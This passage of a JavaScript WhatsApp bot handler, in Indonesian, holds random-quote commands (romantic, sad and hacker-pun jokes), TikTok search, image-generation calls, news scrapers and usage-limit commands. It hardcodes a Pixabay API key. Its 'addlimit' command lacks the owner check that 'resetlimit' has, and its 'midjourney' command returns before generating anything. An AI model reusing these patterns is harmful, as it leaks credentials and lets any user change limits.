    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  reply(bacotan)
}
break
//=========================================\\======
case 'quotesgombal': {
    function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const gombal = [
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "Seandainya sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "Aku gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "Kamu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "Kalausaja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "denganambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta.",
    "Kalo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku harap kamu tidak menanyakan hal terindah yang pernah singgah di kehidupanku, karena jawaban nya adalah kamu.",
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "seandainyaa sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "kuu gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "kamuu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "jikaa saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "atuu tambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta,.",
    "aloo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku tak pernah berjanji untuk sebuah perasaan, namun aku berusaha berjanji untuk sebuah kesetiaan.",
    "Aku sangat berharap kamu tau, kalau aku tidak pernah menyesali cintaku untuk mu, karena bagiku memiliki kamu sudah cukup bagi ku.",
    "Jangankan memilikimu, mendengar kamu kentut aja aku sudah bahagia.",
    "Aku mohon jangan jalan-jalan terus di pikiranku, duduk yang manis di hatiku saja.",
    "Berulang tahun memang indah, namun bagiku yang lebih indah jika berulang kali bersamamu.",
    "Napas aku kok sesek banget ya?, karena separuh nafasku ada di kamu.",
    "Jika ada seseorang lebih memilih pergi meninggalkan kamu, jangan pernah memohon padanya untuk tetap bertahan. Karena jika dia cinta, dia tak akan mau pergi.",
    "jangann diam aja dong, memang diam itu emas, tapi ketahuilah suara kamu itu seperti berlian.",
    "Kesasar itu serasa rugi banget, namun aku nggak merasa rugi karena cintaku sudah Biasanya orang yang lagi nyasar itu rugi ya, tapi tau gak? Aku gak merasa rugi sebab cintaku sudah nyasar ke hati bidadari.",
    "Ada 3 hal yang paling aku sukai di dunia ini, yaitu Matahari, Bulan dan Kamu. Matahari untuk siang hari, Bulan untuk malam hari dan Kamu untuk selamanya dihatiku.",
    "Sayang, kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.",
    "kuu gak perlu wanita yang sholeha, tapi bagaimana menuntun wanita yang aku cintai menjadi seorang yang sholehah.",
    "Aku tidak minta bintang atau bulan kepadamu. Cukup temani aku selamanya di bawah cahayanya.",
    "Akuana kalo kita berdua jadi komplotan penjahat: Aku mencuri hatimu, dan kamu mencuri hatiku?",
    "Aku gak perlu wanita yang cantik, tapi bagaimana aku menyanjung wanita yang aku cintai seperti wanita yang paling cantik di bumi ini.",
    "Aku pengen bersamamu cuma pada dua waktu: SEKARANG dan SELAMANYA.",
    "Akuu tuh bikin aku ga bisa tidur tau ga?",
    "Soalnya kamu selalu ada dibayang-bayang aku terus.",
    "Jika aku bisa jadi bagian dari dirimu,aku mau jadi air matamu,yang tersimpan di hatimu, lahir dari matamu, hidup di pipimu, dan mati di bibirmu.",
    "Papa kamu pasti kerja di apotik ya? | kenapa bang? | karena cuma kamu obat sakit hatiku.",
    "akuu selalu berusaha tak menangis karenamu, karena setiap butir yang jatuh, hanya makin mengingatkan, betapa aku tak bisa melepaskanmu.",
    "mauu nanya jalan nih. Jalan ke hatimu lewat mana ya?",
    "Andai sebuah bintang akan jatuh setiap kali aku mengingatmu, bulan pasti protes. Soalnya dia bakal sendirian di angkasa.",
    "Andai kamu gawang aku bolanya. Aku rela ditendang orang-orang demi aku dapat bersamamu,",
    "Dingin malam ini menusuk tulang. Kesendirian adalah kesepian. Maukah kau jadi selimut penghangat diriku?",
    "Keindahan Borobudur keajaiban dunia, keindahan kamu keajaiban cinta.",
    "Aku ingin mengaku dosa. Jangan pernah marah ya. Maafkan sebelumnya. Tadi malam aku mimpiin kamu jadi pacarku. Setelah bangun, akankah mimpiku jadi nyata?",
    "Kalau nggak sih aku bilang aku cinta kamu hari ini? Kalau besok gimana? Besok lusa? Besoknya besok lusa? Gimana kalau selamanya?",
    "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.",
    "Jika malam adalah jeruji gelap yang menjadi sangkar, saya ingin terjebak selamanya di sana bersamamu.",
    "Sekarang aku gendutan gak sih? Kamu tau gak kenapa ? Soalnya kamu sudah mengembangkan cinta yang banyak di hatiku.",
    "Di atas langit masih ada langit. Di bawah langit masih ada aku yang mencintai kamu.",
    "Tau tidak kenapa malam ini tidak ada bintang? Soalnya bintangnya pindah semua ke matamu?",
    "Aku mencintaimu! Jika kamu benci aku, panah saja diriku. Tapi jangan di hatiku ya, karena di situ kamu berada.",
    "Bapak kamu pasti seorang astronot? | kok tau? | Soalnya aku melihat banyak bintang di matamu.",
    "Bapak kamu dosen ya? | kok tau? | karena nilai kamu A+ di hatiku.",
    "Kamu pasti kuliah di seni pahat ya? | kok tau sih? | Soalnya kamu pintar sekali memahat namamu di hatiku.",
    "Ya Tuhan, jika dia jodohku, menangkanlah tender pembangunan proyek menara cintaku di hatinya.",
    "Kamu mantan pencuri ya? | kok tau? | Abisnya kamu mencuri hatiku sih!",
    "Cowok : Aku suka senyum-senyum sendiri lho. | Cewek : Hah .. Gila Ya | Cowok : Nggak. Aku sedang mikirin kamu.",
    "Setiap malam aku berjalan-jalan di suatu tempat. Kamu tau di mana itu ? | gatau, emang dimana? | Di hatimu.",
    "Kamu pake Telkomesl ya? Karena sinyal-sinyal cintamu sangat kuat sampai ke hatiku.",
    "Kamu tahu gak sih? AKu tuh capek banget. Capek nahan kangen terus sama kamu.",
    "katanyaa kalau sering hujan itu bisa membuat seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.",
    "Aku harap kamu jangan pergi lagi ya? karena, bila aku berpisah dengamu sedetik saja bagaikan 1000 tahun rasanya.",
    "Aku sih gak butuh week end, yang aku butuhkan hanyalah love you till the end.",
    "Emak kamu tukang Gado gado ya?, kok tau sih?, Pantesan saja kamu telah mencampur adukan perasaanku",
    "Walau hari ini cerah, tetapi tanpa kamu disisiku sama saja berselimutkan awan gelap di hati ini",
    "Kamu ngizinin aku kangen sehari berapa kali neng? Abang takut over dosis.",
    "cintaa aku ke kamu tuh bagaikan hutang, awalnya kecil, lama-lama didiemin malah tambah gede.",
    "Berulang tahun adalah hari yang indah. Tapih akin lebih indah kalo udah berulang-ulang kali bersama kamu."
]
let bacotan = pickRandom(gombal)
  reply(bacotan)

}
break
//=========================================\\======
case 'quoteshacker': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const heker = [
  "Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?",
  "Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.",
  "Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.",
  "berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.",
  "Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg open_basedir enabled.",
  "Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.",
  "Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.",
  "Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.",
  "Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |",
  "Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile",
  "Aku deketin kamu cuma untuk redirect ke hati temenmu.",
  "Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?",
  "Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad",
  "kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain",
  "Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin",
  "Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().",
  "SQLI ( Structured Query Love Injection )",
  "aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu",
  "Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.",
  "kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile",
  "Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.",
  "hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.",
  "Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.",
  "Jangan men-dualboot-kan hatiku kepadamu.",
  "cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.",
  "KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.",
  "Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku",
  "cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"
]

let bacotan = pickRandom(heker)
  reply(bacotan)
}
break
//=========================================\\======
case 'quotesbijak':{
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const quotes = [
"Keyakinan merupakan suatu pengetahuan di dalam hati, jauh tak terjangkau oleh bukti.",
"Rasa bahagia dan tak bahagia bukan berasal dari apa yang kamu miliki, bukan pula berasal dari siapa diri kamu, atau apa yang kamu kerjakan. Bahagia dan tak bahagia berasal dari pikiran kamu.",
"Sakit dalam perjuangan itu hanya sementara. Bisa jadi kamu rasakan dalam semenit, sejam, sehari, atau setahun. Namun jika menyerah, rasa sakit itu akan terasa selamanya.",
"Hanya seseorang yang takut yang bisa bertindak berani. Tanpa rasa takut itu tidak ada apapun yang bisa disebut berani.",
"Jadilah diri kamu sendiri. Siapa lagi yang bisa melakukannya lebih baik ketimbang diri kamu sendiri?",
"Kesempatan kamu untuk sukses di setiap kondisi selalu dapat diukur oleh seberapa besar kepercayaan kamu pada diri sendiri.",
"Kebanggaan kita yang terbesar adalah bukan tidak pernah gagal, tetapi bangkit kembali setiap kali kita jatuh.",
"Suatu pekerjaan yang paling tak kunjung bisa diselesaikan adalah pekerjaan yang tak kunjung pernah dimulai.",
"Pikiran kamu bagaikan api yang perlu dinyalakan, bukan bejana yang menanti untuk diisi.",
"Kejujuran adalah batu penjuru dari segala kesuksesan. Pengakuan adalah motivasi terkuat. Bahkan kritik dapat membangun rasa percaya diri saat disisipkan di antara pujian.",
"Segala sesuatu memiliki kesudahan, yang sudah berakhir biarlah berlalu dan yakinlah semua akan baik-baik saja.",
"Setiap detik sangatlah berharga karena waktu mengetahui banyak hal, termasuk rahasia hati.",
"Jika kamu tak menemukan buku yang kamu cari di rak, maka tulislah sendiri.",
"Jika hatimu banyak merasakan sakit, maka belajarlah dari rasa sakit itu untuk tidak memberikan rasa sakit pada orang lain.",
"Hidup tak selamanya tentang pacar.",
"Rumah bukan hanya sebuah tempat, tetapi itu adalah perasaan.",
"Pilih mana: Orang yang memimpikan kesuksesan atau orang yang membuatnya menjadi kenyataan?",
"Kamu mungkin tidak bisa menyiram bunga yang sudah layu dan berharap ia akan mekar kembali, tapi kamu bisa menanam bunga yang baru dengan harapan yang lebih baik dari sebelumnya.",
"Bukan bahagia yang menjadikan kita bersyukur, tetapi dengan bersyukurlah yang akan menjadikan hidup kita bahagia.",
"Aku memang diam. Tapi aku tidak buta.",
]
let bacotan = pickRandom(quotes)
  reply(bacotan)
}
break//==================================================================

case 'youai': {
  if (!text) return replyviex(`Contoh : ${command} siapakah elon musk`)
  replyviex(mess.wait)
DinzIDai(pushname, text);
}
break
//==================================================================
case 'tiktoksearch':
case 'tiktoks':
case 'ttsearch': {

    if (!text) return reply(`Gunakan dengan cara ${prefix + command} *query*\n\n_Contoh_\n\n${prefix + command} jj epep`);
    try {
        let serach = await tiktokSearchVideo(text);
        if (!serach.videos || serach.videos.length === 0) return reply('Tidak ada video ditemukan.');

        // Ambil video acak
        let randomVideo = serach.videos[Math.floor(Math.random() * serach.videos.length)];

        let teks = `*Hii ${pushname}, ini hasil acak TikTok Search*\n\n` +
                   `*⭔ Title* : ${randomVideo.title}\n` +
                   `*⭔ Video ID* : ${randomVideo.video_id}\n` +
                   `*⭔ Username* : ${randomVideo.author.unique_id}\n` +
                   `*⭔ Nickname* : ${randomVideo.author.nickname}\n` +
                   `*⭔ Duration* : ${randomVideo.duration} detik\n` +
                   `*⭔ VT Like* : ${randomVideo.digg_count}\n` +
                   `*⭔ Comment* : ${randomVideo.comment_count}\n` +
                   `*⭔ Share* : ${randomVideo.share_count}\n` +
                   `*⭔ Url* : https://www.tiktok.com/@${randomVideo.author.unique_id}/video/${randomVideo.video_id}\n`;

        // Kirim ke chat pribadi user
        await TradzSigma.sendMessage(m.sender, {
            video: { url: `https://tikwm.com${randomVideo.play}` },
            caption: teks
        }, { quoted: qloc });

        // Button "Next Video"
        const buttons = [
            { buttonId: `${prefix + command} ${text}`, buttonText: { displayText: '▶️ Next Video' }, type: 1 }
        ];

        const buttonMessage = {
            text: `*Berhasil!* Video TikTok acak telah dikirim ke private chat kamu ya ${pushname}!\n\nKlik tombol di bawah untuk cari video selanjutnya. Otomatos Video Selanjut Nya Di Kirim Ke Pribadi Kamu`,
            buttons: buttons,
            footer: 'TikTok Search Bot',
            headerType: 1
        };

        // Kirim balasan ke chat asal (grup/chat)
        await TradzSigma.sendMessage(m.chat, buttonMessage, { quoted: m });

    } catch (error) {
        console.log(error);
        reply(`Gagal mengambil video.\n\nError: ${error.message || 'Terjadi kesalahan.'}`);
    }
}
db.data.users[m.sender].exp += await randomNomor(60)
break;
//==================================================================
//==================================================================
case 'midjourney':
case 'mdjourney': {
  if (!q) return reply('promt nya Kak')
replyviex(mess.wait)
	try {
	const sanai = {
  create: async (
    prompt = "Daffa",
    weight = 1024,
    height = 1024,
    guiscale = 5,
    paguiscale = 2,
    nis = 18,
    step = 20,
    sid = -1
  ) => {
    const url = 'https://api.freesana.ai/v1/images/generate';
    const headers = {
      'authority': 'api.freesana.ai',
      'origin': 'https://freesana.ai',
      'referer': 'https://freesana.ai/',
      'user-agent': 'Postify/1.0.0',
    };
    const data = {
      prompt: prompt,
      model: "sana_1_6b",
      width: weight,
      height: height,
      guidance_scale: guiscale,
      pag_guidance_scale: paguiscale,
      num_inference_steps: nis,
      steps: step,
      seed: sid,
    };
    try {
      const response = await axios.post(url, data, { headers });
      const { id, status, result, processingTime, width, height, nsfw, seed } = response.data;
      return {
        id,
        status,
        result,
        processingTime,
        width,
        height,
        nsfw,
        seed,
      };
    } catch (error) {
      console.error(error);
      throw error;
    }
  },
}
    return replyviex(`Contoh penggunaan:\n${prefix + command} <deskripsi gambar>\n\nMisal:\n${prefix + command} "gunung di pagi hari"`);
  replyviex('Sedang membuat gambar..');
    const response = await sanai.create(text);
    if (response && response.result) {
      const imageUrl = response.result;
      await TradzSigma.sendFile(m.chat, imageUrl, 'generated-image.jpg', `✅ Gambar berhasil dibuat!\n\n• Prompt: *${text}*\n• Resolusi: ${response.width}x${response.height}\n• Waktu proses: ${response.processingTime} detik`, m);
    } else {
      replyviex('❌ Gagal membuat gambar. Silakan coba lagi.');
    }
  } catch (error) {
    console.error(error);
    m.reply('❌ Terjadi kesalahan saat membuat gambar. Silakan coba lagi nanti.');
  }
}
break;
//==================================================================
 case 'dalle': {
  if (!text) return replyviex(`*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${prefix + command} Beautiful anime girl*\n*${prefix + command} girl in pink dress*`)
  	try {
  	  replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
  }
  break
//==================================================================
case 'text2image':
case 'text2img': {
if (!text) return reply('promt nya Kak')
replyviex(mess.wait)
	try {
TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}__`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
//=============================================================
case 'anything': {
  if (!q) return reply('promt nya Kak')
  try {
  	  replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}__`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
//=============================================================
case 'absolutely': {
  if (!q) return reply('promt nya Kak')
	try {  	  replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
case 'pixabay': {
async function formatNumber(integer) {
      let numb = parseInt(integer)
      return Number(numb).toLocaleString().replace(/,/g, '.')
   }
      if (!text) return reply(`*Contoh :* ${prefix + command} *[type query]*
 
List Type :
* *Image*
* *Video*`)
   let keyword = text.split(" ")[0];
   let data = text.slice(keyword.length + 1);
    if (keyword.toLowerCase() === "image") {
        if (!data) return reply( `*Contoh :* ${prefix + command} image *[query]*`)
         let res = await(await axios.get("https://pixabay.com/api/?key=30089426-4575ed7bbbc8bfffe9a0b8eb4&q=" + data)).data;
     let rand = res.hits[Math.floor(Math.random() * res.hits.length)]
   let cap = `*± P I X - A B A Y*
* *Type :* ${rand.type}
* *Tags :* ${rand.tags}
* *Size :* ${rand.imageWidth} x ${rand.imageHeight}
* *Views :* ${await formatNumber(rand.views)}
* *Likes :* ${await formatNumber(rand.likes)}
* *Comments :* ${await formatNumber(rand.comments)}
* *Downloads :* ${await formatNumber(rand.downloads)}
* *Username :* ${rand.user} *[ ${rand.user_id} ]*

_Media Has been sent, Please wait...._`
     let q = await TradzSigma.sendMessage(m.chat, { 
              text: cap 
              }, {
            quoted: m 
         });
       await TradzSigma.sendMessage(m.chat, {
            image: {
              url: rand.largeImageURL
            }}, {
            quoted: m
         });
         } else if (keyword.toLowerCase() === "video") {
      if (!data) return reply( `*Contoh :* ${prefix + command} video *[query]*`)
         let res = await(await axios.get("https://pixabay.com/api/videos?key=30089426-4575ed7bbbc8bfffe9a0b8eb4&q=" + data)).data;
     let rand = res.hits[Math.floor(Math.random() * res.hits.length)]
     let cap = `*± P I X - A B A Y*
* *Type :* ${rand.type}
* *Tags :* ${rand.tags}
* *Duration :* ${rand.duration} seconds
* *Views :* ${await formatNumber(rand.views)}
* *Likes :* ${await formatNumber(rand.likes)}
* *Comments :* ${await formatNumber(rand.comments)}
* *Downloads :* ${await formatNumber(rand.downloads)}
* *Username :* ${rand.user} *[ ${rand.user_id} ]*

_Media Has been sent, Please wait...._`
     let q = await TradzSigma.sendMessage(m.chat, {
            image: {
              url: rand.videos["medium"].thumbnail
               },
             caption: cap
            }, {
            quoted: m
         });
       await TradzSigma.sendMessage(m.chat, {
            video: {
              url: rand.videos["medium"].url
             },
          gifPlayBack: true
         }, {
            quoted: m
         });
      }
  } 
  break
//=================================//
 case 'fajar':{
FajarNews().then(async(res) => {
console.log(res) 
no = 0
iwan = ""
for (let i of res) {
no += 1
iwan += `\n• ${no.toString()} •\n`
iwan += `Berita: ${i.berita}\n`
iwan += `Upload: ${i.berita_diupload}\n`
iwan += `Jenis: ${i.berita_jenis}\n`
iwan += `Link: ${i.berita_url}\n`
}
iwan += ""
reply(iwan) 
})
}
break
//=================================================//
case 'cnn': {
CNNNews().then(res => {
no = 0
iwann = ""
for (let i of res) {
no += 1
iwann += `\n• ${no.toString()} •\n`
iwann += `Berita: ${i.berita}\n`
iwann += `Link: ${i.berita_url}\n`
}
iwann += ""
reply(iwann) 
})
}
break
//=================================================//
case 'layarkaca': {
if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
iwannn = ""
for (let i of res) {
no += 1
iwannn += `\n• ${no.toString()} •\n`
iwannn += `Film: ${i.film_title}\n`
iwannn += `Link: ${i.film_link}\n`
}
iwannn += ``
reply(iwannn) 
})
}
break
//=================================================//
case 'cnbc': {
    try {
        CNBCNews().then(async (res) => {
            let no = 0;
            let iwannnn = "";
            for (let i of res) {
                no += 1;
                iwannnn += `\n• ${no.toString()} •\n`;
                iwannnn += `Berita: ${i.berita}\n`;
                iwannnn += `Upload: ${i.berita_diupload}\n`;
                iwannnn += `Link: ${i.berita_url}\n`;
            }
            iwannnn += "";

            const thumb = res[0]?.berita_thumb || ''; // Pastikan 'berita_thumb' tidak undefined
            await TradzSigma.sendMessage(m.chat, { 
                image: { url: thumb }, 
                caption: iwannnn 
            }, { quoted: m });
        }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break;

//=================================================//
case 'tribun': {
  try {
TribunNews().then(async(res) => {
no = 0
iwannnnn = ""
for (let i of res) {
no += 1
iwannnnn += `\n• ${no.toString()} •\n`
iwannnnn += `Berita: ${i.berita}\n`
iwannnnn += `Upload: ${i.berita_diupload}\n`
iwannnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnn += `Link: ${i.berita_url}\n`
}
iwannnnn += ""
TradzSigma.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'indozone': {
  try {
IndozoneNews().then(async(res) => {
no = 0
iwannnnnn = ""
for (let i of res) {
no += 1
iwannnnnn += `\n• ${no.toString()} •\n`
iwannnnnn += `Berita: ${i.berita}\n`
iwannnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnn += ""
TradzSigma.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'kompas': {
  try {
KompasNews().then(async(res) => {
no = 0
iwannnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnn += `Berita: ${i.berita}\n`
iwannnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnn += ""
TradzSigma.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'detiknews': {
  try {
DetikNews().then(async(res) => {
no = 0
iwannnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnn += ""
TradzSigma.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
case 'resetlimit': {
    if (!TradID) return m.reply("❌ Hanya owner yang bisa reset limit.");
    for (let user in limitDB) {
        limitDB[user].limit = 10;
        limitDB[user].lastClaim = getToday();
    }
    fs.writeFileSync(LIMIT_PATH, JSON.stringify(limitDB, null, 2));
    m.reply('✅ Semua limit telah direset.');
    break;
}
case 'limit': {
    if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
    const sisa = cekLimit(m.sender);
    m.reply(`🔋 Sisa limit RPG kamu hari ini: *${sisa}*`);
    break;
}
case 'addlimit': {
    let target = m.quoted ? m.quoted.sender : (args[0]?.replace(/\D/g, '') + '@s.whatsapp.net')
    let count = parseInt(args[1]) || 0
    if (!target || isNaN(count)) return reply('Format salah.')

    if (!global.db.users[target]) global.db.users[target] = {}
    global.db.users[target].limit = (global.db.users[target].limit || 0) + count

    // ⬇ Simpan ke file limit.json
    fs.writeFileSync(LIMIT_PATH, JSON.stringify(global.db.users, null, 2))

